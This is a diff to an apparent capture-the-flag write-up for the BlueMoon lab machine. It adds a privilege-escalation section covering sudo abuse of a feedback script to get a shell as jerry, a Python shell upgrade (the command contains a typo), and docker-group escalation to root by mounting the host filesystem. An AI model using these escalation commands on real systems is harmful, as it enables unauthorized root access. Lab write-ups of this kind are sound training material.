@@ -138,8 +138,49 @@ ssh robin@192.168.56.101
 ```
 I entered the password ```k4rv3ndh4nh4ck3r``` found during the brute-force attack and successfully gained access to the machine
 
-The command prompt changed to robin@BlueMoon:~$, confirming that I now have a stable shell on the target system.
+The command prompt changed to ```robin@BlueMoon:~$```, confirming that I now have a stable shell on the target system.
 
+## 6. Privilege excalation
+
+**Robin to Jerry**
+I executed the feedback.sh script as the user jerry using my sudo permissions. By providing ```/bin/bash``` as the feedback input, I successfully bypassed the script's intended function and gained a shell as jerry.
+
+```bash
+whoami
+jerry
+```
+Upgrade shell using Python with the command:
+
+```bash
+python3 -c 'import pty; pty.spwn("/bin/bash")'
+```
+
+After upgrading my shell with Python, I checked my user ID and discovered that jerry is a member of the docker group.
+
+**Jerry to Root**
+After gaining access as jerry, I ran the ```id``` command and discovered that the user is a member of the docker group.
+
+I used the following command to verify that the alpine image was locally available:
+
+```bash
+docker images
+```
+
+I executed a Docker command to mount the host's entire root filesystem into the container's /mnt directory:
+
+```bash
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+Once I gained root access, I navigated to the root directory to read the final flag:
+
+```bash
+cd /root
+cat root.txt
+```
+
+I successfully captured the final flag:
+
+```Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}```
 
 
 
